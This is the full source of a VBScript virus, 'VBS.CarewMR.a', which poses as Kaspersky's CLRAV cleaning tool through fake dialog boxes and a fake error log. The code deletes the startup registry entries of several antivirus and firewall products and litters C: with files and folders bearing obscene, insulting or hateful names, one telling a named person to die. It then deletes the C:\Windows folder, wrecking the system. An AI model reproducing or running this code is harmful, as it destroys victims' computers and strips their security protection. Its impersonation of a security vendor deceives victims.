'VBS.CarewMR.a By Jadraquer Killer (Mr.Carew)
On Error Resume Next                                       
Set carew= CreateObject("WScript.Shell")

'In memory of Rocio and Pamela :)
     	
Msgbox "Welcome to CLRAV of Kaspersky Labs, press OK or Accept to Start scanning your computer. "
Msgbox "ERROR!, Code error:3212552, please execute this tool in MS-DOS."
Msgbox "Thank You for prefer Kaspersky Labs Products"
If Month(Now()) = 09 And  Day(Now()) = 01 Then MsgBox "Mr.Carew vuelve otra vez!!, jaja"
  
carew.Run "http:\\www.avp.ru" 


carew.regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\SystemTray"
carew.regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\AVPCC"
carew.regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\NAVW32"
carew.regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\TrueVector"
carew.regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\ZoneAlarm Pro"







Set carew= CreateObject("scripting.filesystemobject") 
  
carew.CreateTextFile "C:\Norton2003isbad_preferKAVORAVP" 
carew.CreateTextFile "C:\AVP" 
carew.CreateTextFile "C:\NAV" 
carew.CreateTextFile "C:\CHILE" 
carew.CreateTextFile "C:\TEMUCO" 
carew.CreateTextFile "C:\MCAFEE" 
carew.CreateTextFile "C:\ENTELPCS" 

carew.CreateTextFile "C:\GSM1900MHZ" 
carew.CreateTextFile "C:\SONYERICSSON" 
carew.CreateTextFile "C:\CAREFULLY_WHIT_ME" 

carew.CreateTextFile "C:\YOUR_PC_IS_VERY_BAD" 
carew.CreateTextFile "C:\I HATE MELINA" 
carew.CreateTextFile "C:\VBS.CarewMR.a"
carew.CreateTextFile "C:\Windows is a real virus?" 
carew.CreateTextFile "C:\MELINA_TE_ODIO_MUERETE!" 
carew.CreateTextFile "C:\WindowsXP"
carew.CreateTextFile "C:\Windows3.11" 
carew.CreateTextFile "C:\Windows98SE"
carew.CreateTextFile "C:\WindowsME"  
carew.CreateTextFile "C:\Windows 95" 
carew.CreateTextFile "C:\WindowsNT"
carew.CreateTextFile "C:\Windows2000"
carew.CreateTextFile "C:\TELLCELL S.A"
carew.CreateTextFile "C:\PORN"
carew.CreateTextFile "C:\ORAL_SEX"
carew.CreateTextFile "C:\BIN_LADEN_FUCKYOU"
carew.CreateTextFile "C:\ICQ"
carew.CreateTextFile "C:\PANDA"
carew.CreateTextFile "C:\NOD32"
carew.CreateTextFile "C:\TREND"
carew.CreateTextFile "C:\PC-CILLIN"
carew.CreateTextFile "C:\AvpM.exe" 
carew.CreateTextFile "C:\Kaspersky_AntiVirus_PersonalPRO_THEBEST!!!!!"
carew.CreateTextFile "C:\Norton_thePOOR"
carew.CreateTextFile "C:\Madonna_Sucking_my_dick.avi"
carew.CreateTextFile "C:\Your_system_is_infected_by_a_virus_jajajajajajaja.jajajaja"   

carew.CreateTextFile "C:\THE_HEURISTIC_OF_NORTON_IS_VERY_BAD_AND_PRODUCE:POSITIVES-FALSES" 

carew.CreateFolder "C:\Symantec" 
carew.CreateFolder "C:\KasperskyLabs" 
carew.CreateFolder "C:\PandaSoftware" 
carew.CreateFolder "C:\TrendMicro" 
carew.CreateFolder "C:\Eset-Nod-fucked" 




          


carew.deleteFolder "C:\Windows" 

set virus = carew.CreateTextFile (".\CLRAV_Report.log",False)
virus.Writeline "Due an error, Code error:3212552, CLRAV has not disinfect your computer"                                 
virus.Writeline "For Support please send a e-mail to support@kaspersky.com and please indicate the Code Error." 			
virus.Close					       
	